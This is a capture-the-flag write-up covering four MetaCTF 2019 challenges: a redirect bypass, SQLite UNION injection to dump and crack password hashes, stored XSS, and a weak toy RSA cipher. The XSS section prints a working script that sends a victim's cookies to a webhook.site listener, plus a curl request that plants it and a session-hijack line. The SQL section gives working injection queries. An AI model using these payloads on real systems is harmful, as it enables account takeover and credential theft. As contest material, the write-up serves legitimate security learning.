---
title: MetaCTF 2019 Writeups
author: Andy Smith
mathjax: true
---

These are my solutions to a few of the problems from the MetaCTF 2019 competition at UVA.

Web Exploitation
* [Logout-Protected Pages (300pts)](#Logout-Protected-Pages-(300pts))

* [Satisfactory Qabalistic Laboratories (325pts)](#Satisfactory-Qabalistic-Laboratories-(325pts))

* [Cross Blog Scripting (400pts)](#Cross-Blog-Scripting-(400pts))

Cryptography
* [RSA 0.5 (375pts)](#RSA-0.5-(375pts))


# Web Exploitation
## Logout-Protected Pages (300pts)
![c3_employee_knowledgebase.png](/assets/images/metactf/c3_employee_knowledgebase.png)
In this problem we're given a login page and need to access the internal wiki. Trying to browse to the wiki gives a 302 Found redirect with a header `Location: ./?error=unauthorized&source=./knowledgebase.php`. Chrome happily follows this redirect and does not display any information in the response body, however if we use a command line tool like `curl` we can just ignore this redirect. Running `curl https://problems.metactf.com/content/logout-protected/knowledgebase.php` we get the contents of the wiki. Scrolling through the lorem ipsum text, we can find `<b>MetaCTF Flag: rest_in_peace_php_die_function</b>`. 

---

## Satisfactory Qabalistic Laboratories (325pts)
![lab_equipment_1.png](/assets/images/metactf/lab_equipment_1.png)

This problem starts off looking similar to the previous. Based on the URL (https://problems.metactf.com/content/sq-labs-nb) this is probably a SQL injection challenge. I tried the login page first but the username and password fields appeared to not be injectable. There is however another page, and it has a search box.

![lab_equipment_2.png](/assets/images/metactf/lab_equipment_2.png)

I first tried adding a `'` to the search, and we get a SQLite3 error:

```sql
SQLite3 error: cannot prepare statement, unrecognized token: "'"
SELECT * FROM equipment WHERE item_name LIKE '%'%'
```

This gives us the entire query. We can easily escape this by using an apostrophe. Now it's time to find the users table. Through a small amount of trial and error, you can find that the users table is called `users`. I tried to select from this table using `'; SELECT * FROM users;` but it appears that the page is only giving us results from the first query. So we can instead append the user data to the lab data using a `UNION` operator. I tried searching with `' UNION SELECT * FROM users;` but it gives the error:

```sql
SQLite3 error: cannot prepare statement, SELECTs to the left and right of UNION do not have the same number of result columns
SELECT * FROM equipment WHERE item_name LIKE '%' UNION SELECT * FROM users;%'
```

If you use a `UNION` operator, the tables you concatenate must both have the same number of columns. To get around this, we can pad the users table with a `null` column. Running `' UNION SELECT *, null FROM users;` gives us an appropriate output, meaning the users table must have 4 columns since we know the equipment table has 5. Now the table has more rows, and a few stick out as possible usernames like the row below:

![lab_equipment_3.png](/assets/images/metactf/lab_equipment_3.png)

I noticed that the serial number column looks more like a hash for the user rows, so maybe this is the password hash? We need some way of reordering the columns so the password column is not masked. Using more trial and error, I found that the username column is named username, but the password column is not called anything normal (password, passwd, pass, pw, pwd, etc). So how do we reorder columns in SQL if we don't know their names? I tried getting the schema for the various SQLite methods for this like `pragma table_info(users)` and `.schema` but these did not process correctly or were ignored by the server. This means we need to find a way of reordering the columns without knowing their names. Using a SQL subquery, we can construct our own table and change the order of the columns. The command I used is:

```sql
UNION SELECT T.a, T.b, T.c, T.d, null FROM (SELECT "a", "b", "c", "d" UNION SELECT * FROM USERS) AS T;
```

Inside the subquery above, I create a data set with `SELECT "a", "b", "c", "d"`. SQLite by default will use these values as the names of the columns in this temporary table. Using `UNION SELECT * FROM USERS`, we now have the USERS table but with columns named a, b, c, and d. Naming this temporary table `T`, We can select the individual columns from T using `T.a`, `T.b`, etc. Looking at the rows in the users column, we can see that the columns are probably id, username, name, and password. Updating our query with more friendly column names, we have:

```sql
UNION SELECT null, T.username, T.password, null, null FROM (SELECT "id", "username", "name", "password" UNION SELECT * FROM USERS) AS T;
```

This query above reorders the columns so that the username and password columns are not masked. Now it looks like we have password hashes!

![lab_equipment_4.png](/assets/images/metactf/lab_equipment_4.png)

Unfortunately, these hashes are only 21 characters long and I'm not familiar with any hashes of that length. This column must truncate to 21 characters. Luckily, SQL has a `SUBSTR` function to return a substring. By running two different SQL queries, we can get the first and last parts of the password hash:

```sql
UNION SELECT null, T.username, SUBSTR(T.password, 0, 22), null, null FROM (SELECT "id", "username", "name", "password" UNION SELECT * FROM USERS) AS T;

UNION SELECT null, T.username, SUBSTR(T.password, 22, 22), null, null FROM (SELECT "id", "username", "name", "password" UNION SELECT * FROM USERS) AS T;
```

Running these two commands separately and then concatenating the two values from the user "bison", we get a hash of `d6be6322d62ab5222f4894049e4408bf`. This has a length of 32 characters, which looks suspiciously like MD5. Searching this hash on CrackStation or HashKiller, we find the password is `monkey12`. Logging in with username `bison`, password `monkey12`, we are presented with the flag `jimmy_needs_some_help_lets_hire_little_bobby_tables`

![lab_equipment_5.png](/assets/images/metactf/lab_equipment_5.png)

---

## Cross Blog Scripting (400pts)
![sleek_1.png](/assets/images/metactf/sleek_1.png)

This problem shows an input box to post on Josh's Sleek Blog. Posting some bogus data along with some HTML, we see that HTML is being escaped and script tags don't appear to work.

![sleek_2.png](/assets/images/metactf/sleek_2.png)

However, looking at the payload of the POST we send in the browsers's devtools, we see that the form data sent is already escaped before it reaches the server: 

```
content: <p>&lt;a&gt;Test&lt;/a&gt;</p><p>&lt;script&gt;alert(1)&lt;/script&gt;</p>
```

They are probably only doing client-side sanitization. Now we can do some cross-site scripting. But what can we do? At the bottom of the page, there is an email address provided:

> Feel free to email me with any suggestions for the blog!
> jhatsman1974@gmail.com

If we send a link to our page with malicious JavaScript on it, the site owner will probably click on the link and we can steal his cookie. To be sure we can view cookies using JS, they have to not be marked HttpOnly. Luckily, the `SLEEK_BLOG_SID` cookie is not marked HttpOnly. I crafted up some JS to base64 encode the cookie and send it to a site.

```javascript
<script>var Http = new XMLHttpRequest(); var url="https://webhook.site/324798d6-d071-4174-a84a-15b3c7946216?cookie=" + btoa(document.cookie); Http.open("GET", url);Http.send();</script>
```

I am using [webhook.site](https://webhook.site) which allows you to easily monitor requests to a given URL and can act as a listener for our cookie exfil request. I created a new URL and enabled CORS via the checkbox on the top bar. This will automatically add CORS headers to the responses it sends, otherwise the user's browser will block the request. Now we just need to combine this all together. I URL encoded the JS payload so that we can send it in the content field in the POST request:

```
%3Cscript%3Evar%20Http%20%3D%20new%20XMLHttpRequest%28%29%3B%20var%20url%3D%22https%3A%2F%2Fwebhook.site%2F324798d6-d071-4174-a84a-15b3c7946216%3Fcookie%3D%22%20%2B%20btoa%28document.cookie%29%3B%20Http.open%28%22GET%22%2C%20url%29%3BHttp.send%28%29%3B%3C%2Fscript%3E
```

In Chrome (and other browsers), you can right-click on the request for the post we created earlier in the Network tab and copy the request as a cURL.

![sleek_3.png](/assets/images/metactf/sleek_3.png)

Pasting that into the terminal, I modified the `--data="content=...` parameter with the URL encoded JS payload.

```bash
curl 'https://problems.metactf.com/content/sleekblog/pages/' -H 'Origin: https://problems.metactf.com' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' -H 'Referer: https://problems.metactf.com/content/sleekblog/pages/' -H 'Cookie: SLEEK_BLOG_SID=aa4293832d270247c81387e9f4820ba4;' --data 'content=%3Cscript%3Evar%20Http%20%3D%20new%20XMLHttpRequest%28%29%3B%20var%20url%3D%22https%3A%2F%2Fwebhook.site%2F324798d6-d071-4174-a84a-15b3c7946216%3Fcookie%3D%22%20%2B%20btoa%28document.cookie%29%3B%20Http.open%28%22GET%22%2C%20url%29%3BHttp.send%28%29%3B%3C%2Fscript%3E' --compressed
```

We get a successful result. Searching through te HTML, our new blog post is at `view.php?id=4334073`, so browsing to [https://problems.metactf.com/content/sleekblog/pages/view.php?id=3145041](https://problems.metactf.com/content/sleekblog/pages/view.php?id=3145041) will send the cookie to our webhook.site URL. Now all that is left is to email a link to this page to the email provided on the blog. Sure enough, we get an email response that our URL was clicked:

![sleek_4.png](/assets/images/metactf/sleek_4.png)

Checking our listener on webhook.site, there is a new request with a cookie parameter:

![sleek_5.png](/assets/images/metactf/sleek_5.png)

Base64 decoding this gives us the admin's `SLEEK_BLOG_SID` cookie. We can replace our cookie with the one we just received using the JS console on the page:

```javascript
document.cookie = "SLEEK_BLOG_SID=541a8fe437325df4a9ae026ad2cfa376"
```

Navigating to the homepage, the blog shows us the flag `c4nt_fa11_4_ph1shing_scam5_1f_u_d0nt_ch3ck_y0ur_3ma1l`

![sleek_6.png](/assets/images/metactf/sleek_6.png)

---

# Cryptography
## RSA 0.5 (375pts)
Included files: [rsa05.zip](/assets/images/metactf/rsa05.zip)

We're given a sample.in and sample.out file along with flag.out. The out files are encrypted with a trivial implementation of RSA seen in the `RSA 0.5.py` file. Looking through this code, there are two important items to note. First, the modulus being used is 2^512, which uses 513 bits. Given RSA needs to use much larger numbers than symmetric crypto, the large size of this modulus is not surprising. However, the second key part to note is the encrypt function:
```python
def Encrypt(plaintext, key):
    plaintext_value = int(binascii.hexlify(bytes(plaintext, 'ascii')), 16)
    
    return hex((plaintext_value * key) % modulus)
```

Basic RSA uses the following equation to encrypt a message `m` with encryption key `e`:

$$ c = m^{e}{\pmod{n}} $$

Notice that m is to the power of e. In the Python code provided, the plaintext is only multiplied by the key: `(plaintext_value * key) % modulus`. This will dramatically reduce the size of the integer this equals before using the modulus. If this integer is less than the modulus, then modulus can be effectively ignored, meaning it is just `ciphertext = plaintext_value * key` and the key is now a symmetric key. To verify this, I converted the sample.out hex value to an integer, and it is 423 bits which is less than the 513 of the modulus, so the modulus can be ignored. Solving this equation for the key, `key = ciphertext / plaintext_value`. Opening a Python interactive shell, we can do this computation with the sample.in and sample.out.

```python
>>> import binascii
>>> plaintext = "SUPER_SECRET_MESSAGE_TO_ENCODE"
>>> ciphertext = "4bc91ba3b7c7bc5221902221fdfecace396d40468a66c1bf3fe51bdfbaf2c63d532234278f4915098f4e61b6913ba7576ded22a80f"
>>> plaintext_value = int(binascii.hexlify(bytes(plaintext, 'ascii')), 16)
>>> ciphertext_value = int(ciphertext, 16)
>>> ciphertext_value // plaintext_value
22299104256150897389636655802354612886708315886735999555
```

Dividing the ciphertext integer by the plaintext integer gives us the key. Let's test to make sure this is the correct key by running `RSA 0.5.py` with the sample.out:
```
What would you like to do?
1: Encrypt
2: Decrypt
3: Exit
Enter a number to continue. 2
What is your key? 22299104256150897389636655802354612886708315886735999555
What do you want to decrypt? 0x4bc91ba3b7c7bc5221902221fdfecace396d40468a66c1bf3fe51bdfbaf2c63d532234278f4915098f4e61b6913ba7576ded22a80f
Your plaintext is SUPER_SECRET_MESSAGE_TO_ENCODE
```

Awesome, it decrypted successfully. Assuming the same encryption key was used to encrypt the flag, we can run the script again with the value of flag.out:

```
What would you like to do?
1: Encrypt
2: Decrypt
3: Exit
Enter a number to continue. 2
What is your key? 22299104256150897389636655802354612886708315886735999555
What do you want to decrypt? 0x5a3495161f9c9f4e356ccad7494fb56262ab638e2a864a07f0569e36f931affdde1fed51d4326f312b77d90b9c4396db7404a03a2fb87ff4a3
Your plaintext is c0ngr@t5_y0u_goT_hAlf_oF_RS@_DOWN!
```

We get the flag, `c0ngr@t5_y0u_goT_hAlf_oF_RS@_DOWN!`